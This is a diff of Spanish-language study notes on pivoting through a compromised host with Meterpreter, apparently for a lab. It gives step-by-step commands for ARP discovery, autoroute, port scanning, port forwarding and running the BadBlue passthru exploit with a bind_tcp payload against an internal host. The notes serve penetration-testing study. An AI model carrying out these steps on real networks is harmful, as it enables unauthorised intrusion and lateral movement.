@@ -1,90 +1,88 @@
-# Pivoting con Meterpreter
+# Pivoting con Meterpreter + Descubrimiento de IPs internas
 
 ## 1. ¿Qué es pivotear?
-En ciberseguridad, **pivotear** significa utilizar una máquina comprometida como punto de salto para acceder a otras máquinas que no son directamente accesibles desde nuestro host atacante.
+Pivotear es utilizar una máquina comprometida como punto de salto para acceder a otras redes o máquinas que no son alcanzables directamente desde nuestro host atacante.
 
-Esto es útil cuando:
-- Nuestro equipo atacante no tiene visibilidad directa de la red interna de la víctima.
-- Las otras máquinas objetivo están en redes internas o subredes distintas.
-- Queremos realizar movimientos laterales (lateral movement) dentro de una infraestructura.
-
----
-
-## 2. ¿Cómo funciona?
-1. Comprometemos una máquina (victima 1) que sí tiene acceso a otra red interna.
-2. Establecemos rutas en Metasploit para que el tráfico pase a través de la sesión de **Meterpreter** de esa máquina.
-3. Desde nuestra máquina atacante podemos escanear y explotar máquinas internas **a través de la víctima comprometida**.
+Se usa cuando:
+- El host atacante no tiene visibilidad directa de ciertos objetivos.
+- Queremos realizar **movimientos laterales** en una red interna.
+- Queremos aprovechar la posición de la máquina comprometida como **puente**.
 
 ---
 
-## 3. Flujo de trabajo paso a paso
+## 2. Flujo de trabajo con descubrimiento previo
 
-### Paso 1: Ganar acceso y reconocer el entorno
+### Paso 1: Ganar acceso y revisar la red
+Desde la sesión Meterpreter:
 ```bash
 meterpreter > sysinfo
 meterpreter > ipconfig
 ```
-- `sysinfo`: Muestra información del sistema operativo.
-- `ipconfig`: Lista todas las interfaces y direcciones IP a las que la máquina tiene acceso.
-
-**Objetivo:** Identificar subredes internas que nuestro host atacante no puede alcanzar directamente.
+- Identificamos las interfaces y redes a las que la máquina comprometida tiene acceso.
 
 ---
 
-### Paso 2: Añadir una ruta para pivotear
-Supongamos que encontramos una interfaz con IP `10.0.28.125`.
-Quitamos el último octeto y lo sustituimos por `.0/20` para cubrir toda la subred:
+### Paso 2: Descubrir otras máquinas en la red con ARP Scan
+Si no conocemos la IP de la segunda máquina, podemos usar:
+```bash
+run arp_scanner -r 10.0.28.0/24
+```
+- `-r`: Rango de IPs a escanear.
+- Nos devolverá una lista de IPs y direcciones MAC activas en la red interna.
+
+Con esto detectamos hosts que están encendidos y pueden ser potenciales objetivos.
+
+---
+
+### Paso 3: Configurar pivoting con autoroute
+Seleccionamos la subred encontrada (por ejemplo, `10.0.28.0/20`) y la añadimos:
 ```bash
 run autoroute -s 10.0.28.0/20
 ```
-- **Qué hace:** Configura Meterpreter para que enrute todo el tráfico hacia esa subred a través de la sesión actual.
+Esto enruta el tráfico hacia esa subred a través de la sesión Meterpreter.
 
 ---
 
-### Paso 3: Mandar la sesión al background y renombrarla
+### Paso 4: Mandar la sesión al background y renombrarla
 ```bash
 background
 sessions -n "victima1"
 ```
-- Renombrar la sesión ayuda a identificarla fácilmente si trabajamos con varias.
+Esto ayuda a mantener organizado el trabajo.
 
 ---
 
-### Paso 4: Escanear la segunda máquina desde la víctima
-Usamos el módulo de escaneo de puertos:
+### Paso 5: Escanear la red interna
+Usamos un escáner de puertos:
 ```bash
 use auxiliary/scanner/portscan/tcp
 set RHOSTS 10.0.28.130
 set PORTS 1-100
 exploit
 ```
-- Esto escanea puertos **a través de la sesión pivotada**.
+- Así identificamos puertos abiertos en la máquina interna.
 
 ---
 
-### Paso 5: Crear un Port Forwarding (portfwd)
-Supongamos que el escaneo detecta un servicio HTTP en el puerto 80:
+### Paso 6: Crear un Port Forwarding
+Supongamos que encontramos un HTTP en el puerto 80:
 ```bash
 portfwd add -l 1234 -p 80 -r 10.0.28.130
 ```
-- `-l 1234`: Puerto local en nuestra máquina.
-- `-p 80`: Puerto de la máquina remota.
-- `-r`: IP de la máquina interna a la que queremos acceder.
+Esto nos permite acceder al servicio HTTP de la máquina interna desde nuestro host atacante en `localhost:1234`.
 
 ---
 
-### Paso 6: Escanear el puerto redirigido desde nuestra máquina
+### Paso 7: Escaneo desde nuestro host
 ```bash
 db_nmap -sS -sV -p 1234 localhost
 ```
-- Escanea el puerto `1234` en `localhost`, que en realidad está reenviado al puerto 80 de la máquina interna.
+Así identificamos el servicio y versión reales.
 
 ---
 
-### Paso 7: Explotar un servicio vulnerable
-Supongamos que `nmap` detecta **BadBlue** vulnerable.
-
-Usamos el exploit correspondiente:
+### Paso 8: Explotación de un servicio interno
+Si el escaneo detecta **BadBlue vulnerable**:
 ```bash
 use exploit/windows/http/passthru
 set payload windows/meterpreter/bind_tcp
@@ -92,26 +90,23 @@ set RHOSTS 10.0.28.130
 set LPORT 4444
 exploit
 ```
-**Nota:**  
-- Se usa `bind_tcp` porque el ataque es desde la víctima interna hacia nosotros (estamos pivotando y puede que no tengamos acceso inverso con `reverse_tcp`).
-- `bind_tcp` hace que el payload abra un puerto en la máquina víctima interna y nuestro Metasploit se conecte a él.
+- Se usa `bind_tcp` porque trabajamos dentro de la red interna y queremos que el objetivo abra un puerto para conectarnos.
 
 ---
 
-## 4. Resumen del proceso
-
-1. **Comprometer primera máquina** (victima1).
-2. **Identificar subred interna** con `ipconfig`.
-3. **Añadir ruta** con `autoroute`.
-4. **Escanear red interna** desde Metasploit.
+## 3. Resumen del proceso
+1. **Comprometer una máquina** accesible.
+2. **Descubrir IPs internas** con ARP scan.
+3. **Configurar rutas** con `autoroute`.
+4. **Escanear puertos** en objetivos internos.
 5. **Redirigir puertos** con `portfwd`.
-6. **Escanear servicios** desde nuestro host.
-7. **Explotar máquinas internas** usando los módulos de Metasploit.
+6. **Escanear desde el atacante** con `nmap`.
+7. **Explotar vulnerabilidades** en máquinas internas.
 
 ---
 
-## 5. Ventajas de pivotear
-- Permite atacar máquinas que no son accesibles directamente.
-- Evita detecciones en la frontera de la red (firewalls externos).
-- Facilita la enumeración y explotación de entornos internos.
-
+## 4. Comando clave para descubrimiento
+```bash
+run arp_scanner -r <rango_subred>
+```
+Este paso es crucial si no conocemos las IPs internas antes de pivotear.
